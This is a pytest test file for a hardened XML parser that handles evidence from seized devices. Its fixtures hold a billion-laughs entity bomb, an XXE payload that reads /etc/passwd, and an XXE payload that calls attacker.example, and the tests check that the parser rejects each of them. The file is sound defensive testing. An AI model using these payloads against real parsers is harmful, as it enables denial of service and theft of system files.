"""Tests for babel.safe_xml — the hardened XML parser used for evidence files.

XML reaching a plugin came off a seized device, so entity expansion has to be
off: a few hundred bytes of nested entities otherwise expands to gigabytes and
takes the worker down mid-ingest.
"""
import xml.etree.ElementTree as ET

import pytest

from babel.safe_xml import parse_file, parse_string

BILLION_LAUGHS = """<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
]>
<packages>&lol2;</packages>"""

XXE_FILE_READ = """<?xml version="1.0"?>
<!DOCTYPE d [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<packages>&xxe;</packages>"""

XXE_HTTP = """<?xml version="1.0"?>
<!DOCTYPE d [ <!ENTITY xxe SYSTEM "http://attacker.example/x"> ]>
<packages>&xxe;</packages>"""

PACKAGES_XML = """<?xml version="1.0" encoding="utf-8"?>
<packages>
  <package name="com.android.chrome" codePath="/data/app/chrome" userId="10123">
    <perms><item name="android.permission.CAMERA" granted="true"/></perms>
  </package>
  <shared-user name="android.uid.system" userId="1000"/>
</packages>"""


@pytest.mark.parametrize(
    "doc", [BILLION_LAUGHS, XXE_FILE_READ, XXE_HTTP],
    ids=["billion-laughs", "xxe-file", "xxe-http"],
)
def test_entity_declarations_are_rejected(doc):
    with pytest.raises(ET.ParseError):
        parse_string(doc)


def test_stock_elementtree_would_have_expanded_it():
    """Guards the premise: without this parser the expansion is real."""
    root = ET.fromstring(BILLION_LAUGHS)
    assert len(root.text) == 300


def test_rejection_is_a_parse_error_subclass():
    """Plugins already catch ET.ParseError, so no handler needs changing."""
    try:
        parse_string(BILLION_LAUGHS)
    except ET.ParseError as exc:
        assert "entity" in str(exc).lower()
    else:
        pytest.fail("entity declaration was not rejected")


def test_benign_document_parses_with_attributes_and_nesting():
    root = parse_string(PACKAGES_XML)
    assert root.tag == "packages"
    pkg = root.find("package")
    assert pkg.get("name") == "com.android.chrome"
    assert pkg.get("userId") == "10123"
    assert pkg.find("perms/item").get("name") == "android.permission.CAMERA"
    assert root.find("shared-user").get("userId") == "1000"


def test_iter_matches_stock_elementtree():
    """The Android plugin walks the tree with root.iter('package')."""
    assert [p.get("name") for p in parse_string(PACKAGES_XML).iter("package")] == [
        p.get("name") for p in ET.fromstring(PACKAGES_XML).iter("package")
    ]


def test_namespaces_use_the_same_canonical_form():
    doc = '<a xmlns:x="urn:t"><x:b x:k="v">hi</x:b></a>'
    ours, stock = parse_string(doc)[0], ET.fromstring(doc)[0]
    assert ours.tag == stock.tag == "{urn:t}b"
    assert ours.attrib == stock.attrib == {"{urn:t}k": "v"}
    assert ours.text == stock.text == "hi"


def test_character_data_and_entity_references_still_work():
    root = parse_string("<a>a &lt; b &amp; c</a>")
    assert root.text == "a < b & c"


def test_malformed_xml_raises_parse_error():
    with pytest.raises(ET.ParseError):
        parse_string("<a><unclosed></a>")


def test_parse_file_reads_from_disk(tmp_path):
    p = tmp_path / "packages.xml"
    p.write_text(PACKAGES_XML)
    tree = parse_file(p)
    assert tree.getroot().tag == "packages"
    assert len(tree.getroot().findall("package")) == 1


def test_parse_file_rejects_entities_on_disk(tmp_path):
    p = tmp_path / "packages.xml"
    p.write_text(BILLION_LAUGHS)
    with pytest.raises(ET.ParseError):
        parse_file(p)
